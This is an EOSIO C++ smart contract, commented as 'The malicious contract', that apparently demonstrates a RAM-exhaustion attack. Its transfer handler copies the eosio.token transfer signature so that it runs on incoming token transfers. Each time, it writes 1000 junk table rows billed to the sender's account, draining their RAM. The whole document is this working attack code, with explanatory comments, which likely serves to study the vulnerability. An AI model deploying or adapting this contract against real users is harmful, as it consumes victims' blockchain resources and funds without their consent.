#include <eosio/eosio.hpp>
#include <eosio/time.hpp>
#include <eosio/asset.hpp>
using namespace eosio;
// The malicious contract
class dataStorage : public eosio::contract
{
        public:
                using contract::contract;
                ///@abi table ttab i64
                struct ttab
                {
                        uint64_t id;
                        uint64_t primary_key() const {return id;}
                        EOSLIB_SERIALIZE(ttab,(id))
                };
                typedef multi_index< "ttab"_n, ttab > _ttab; // The table that will take up the RAM
  
                ///@abi action
                void transfer( name from,
                                name to,
                                asset quantity,
                                std::string memo ) // This function has the same signature as 
                                                   // the transfer function from eosio.token, 
                                                   // so it can be invoked with an appropriate 
                                                   // notification during a token transfer.
                {
                        _ttab ttabs(get_self(),get_self().value);
  
                        uint64_t start = eosio::current_time_point().sec_since_epoch() * 1000;
                        for (int i = 0; i < 1000; i++)
                        {
                                ttabs.emplace(from, [&](auto& data){ // The first parameter 
                                            // here specifies the account 
                                            // that would pay for any used RAM. 
                                            // In this case, it is the sender 
                                            // of the transaction.
                                                data.id = start + i;
                                                });// Places junk data into the table
                        }
                }
};
  
extern "C" {
        void apply( uint64_t receiver, uint64_t code, uint64_t action ) {
                if( code == name("eosio.token") ) { // If the contract is invoked 
                                               // as part of a notification
                        dataStorage thiscontract(receiver);
                        switch( action ) {
                                EOSIO_API( dataStorage, (transfer) ) //Handles the 
                                                                     //transfer function
                        }
                }
        }
}
